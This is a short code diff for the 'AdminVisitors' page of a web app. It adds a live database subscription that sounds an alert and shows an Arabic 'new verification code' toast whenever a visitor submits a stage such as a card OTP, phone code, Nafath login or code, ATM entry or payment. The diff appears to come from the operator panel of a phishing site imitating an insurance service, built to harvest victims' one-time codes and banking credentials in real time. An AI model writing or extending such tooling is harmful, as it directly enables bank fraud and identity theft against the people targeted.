@@ -517,11 +517,29 @@ const AdminVisitors = () => {
         if (selectedVisitorRef.current) fetchLinkedData(selectedVisitorRef.current);
       })
       .subscribe();
+    const stageEventsChannel = supabase
+      .channel("stage-events-realtime-admin")
+      .on("postgres_changes", { event: "INSERT", schema: "public", table: "insurance_order_stage_events" }, (payload: any) => {
+        const row = payload.new;
+        if (row && initialLoadDoneRef.current && localStorage.getItem("admin_feed_mute") !== "true") {
+          sounds.liveFeedAlert();
+          const stageLabels: Record<string, string> = {
+            phone_otp: "كود الجوال", otp: "رمز OTP البطاقة", nafath_login: "دخول نفاذ",
+            nafath_verify: "رمز نفاذ", atm: "ATM", stc_call: "مكالمة STC",
+            phone_verification: "توثيق الجوال", payment: "الدفع",
+          };
+          toast.info(`كود تحقق جديد: ${stageLabels[row.stage] || row.stage}`);
+        }
+        // Auto-refresh stage events for selected visitor
+        if (selectedVisitorRef.current) fetchLinkedData(selectedVisitorRef.current);
+      })
+      .subscribe();
     return () => {
       clearInterval(interval);
       if (fetchTimerRef.current) clearTimeout(fetchTimerRef.current);
       supabase.removeChannel(visitorsChannel);
       supabase.removeChannel(ordersChannel);
+      supabase.removeChannel(stageEventsChannel);
     };
   }, []);
 
